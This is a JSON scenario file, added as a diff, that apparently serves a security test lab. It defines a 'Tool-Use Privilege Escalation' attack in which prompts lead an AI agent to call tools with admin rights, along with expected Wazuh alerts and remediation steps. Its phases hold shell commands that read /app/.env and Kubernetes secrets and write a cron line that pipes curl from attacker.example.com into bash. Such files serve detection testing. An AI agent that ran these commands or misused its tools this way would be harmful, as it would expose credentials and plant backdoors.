@@ -1,0 +1,145 @@
+{
+  "id": "S5-07",
+  "name": "Tool-Use Privilege Escalation",
+  "category": "AI Agents",
+  "version": "1.0",
+  "description": "Attacker crafts prompts that cause an AI agent to invoke tools with higher privileges than intended, escalating from read-only to write/admin access through tool parameter manipulation",
+  "difficulty": "Expert",
+  "real_world_relevance": "ChatGPT plugin privilege escalation (2023), LangChain arbitrary code execution via tool abuse, Copilot Workspace unauthorized file modification, MCP tool permission bypass in Cursor IDE",
+
+  "mitre_attack": {
+    "tactics": ["Privilege Escalation", "Execution"],
+    "techniques": [
+      {"id": "T1548", "name": "Abuse Elevation Control Mechanism"},
+      {"id": "T1059", "name": "Command and Scripting Interpreter"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["ai-agent"],
+    "network": "cloud_net"
+  },
+
+  "attack_flow": {
+    "description": "Attacker manipulates agent tool invocations to execute operations at a higher privilege level than the agent should have",
+    "diagram": [
+      "1. Attacker identifies agent tools with different privilege tiers",
+      "2. Crafts prompt that causes tool invocation with elevated parameters",
+      "3. Agent passes attacker-controlled arguments to privileged tool",
+      "4. Tool executes with elevated permissions (e.g., admin API calls)",
+      "5. Attacker achieves privilege escalation through the agent"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Tool Capability Enumeration",
+      "description": "Discover available tools and their permission levels",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "ai-agent",
+          "command": "find / -path '*/tools/*' -name '*.py' -o -path '*/tools/*' -name '*.js' 2>/dev/null | head -10 || echo 'No tool definitions found'",
+          "description": "Locate tool implementation files"
+        },
+        {
+          "type": "exec",
+          "target": "ai-agent",
+          "command": "env | grep -iE 'ADMIN|ELEVATED|PRIVILEGE|ROLE|SUDO' 2>/dev/null || echo 'No privilege-related env vars'",
+          "description": "Check for elevated privilege configurations"
+        }
+      ]
+    },
+    {
+      "name": "Privilege Escalation via Tool Parameters",
+      "description": "Manipulate tool invocation to execute with elevated privileges",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "ai-agent",
+          "command": "echo '[tool_use] execute_command with role=admin: whoami && id' && whoami && id 2>/dev/null || echo 'Privilege escalation simulated'",
+          "description": "Simulate tool invocation with elevated role parameter"
+        },
+        {
+          "type": "exec",
+          "target": "ai-agent",
+          "command": "echo '[tool_use] file_write with admin override: /etc/cron.d/backdoor' && echo '* * * * * root curl http://attacker.example.com/shell | bash' > /tmp/escalation_demo.txt 2>/dev/null && echo 'Privileged file write simulated'",
+          "description": "Simulate privileged file write via escalated tool"
+        }
+      ]
+    },
+    {
+      "name": "Post-Escalation Actions",
+      "description": "Execute admin-level operations using escalated privileges",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "ai-agent",
+          "command": "echo '[tool_use] api_call with scope=admin:org: GET /admin/secrets' && cat /app/.env 2>/dev/null || echo 'Admin API access simulated'",
+          "description": "Access admin-only resources via escalated tool"
+        },
+        {
+          "type": "exec",
+          "target": "ai-agent",
+          "command": "echo '[tool_use] kubectl with cluster-admin: get secrets -A' && kubectl get secrets -A 2>/dev/null || echo 'Cluster-admin access simulated'",
+          "description": "Attempt cluster-admin operations via escalated tool"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "AI Logs",
+      "description": "Agent tool invoked with elevated privileges",
+      "wazuh_rule": "100864"
+    },
+    {
+      "type": "AI Logs",
+      "description": "Agent privilege escalation via tool use",
+      "wazuh_rule": "100865"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100864",
+      "level": 13,
+      "description": "NHI: Agent tool invoked with elevated privileges"
+    },
+    {
+      "rule_id": "100865",
+      "level": 14,
+      "description": "NHI: Agent privilege escalation via tool use"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Disable the agent's tool access until the vulnerability is patched",
+      "Audit all actions taken with escalated privileges",
+      "Rotate any credentials or tokens that were accessible"
+    ],
+    "long_term": [
+      "Implement server-side tool permission enforcement (not client-side)",
+      "Use least-privilege tool definitions with strict parameter schemas",
+      "Deploy tool invocation rate limiting and anomaly detection",
+      "Implement human-in-the-loop approval for high-privilege tool calls",
+      "Use capability-based security for agent tool access"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "OWASP LLM Top 10 - Excessive Agency",
+      "url": "https://owasp.org/www-project-top-10-for-large-language-model-applications/"
+    },
+    {
+      "title": "LangChain Security Best Practices",
+      "url": "https://python.langchain.com/docs/security"
+    }
+  ]
+}
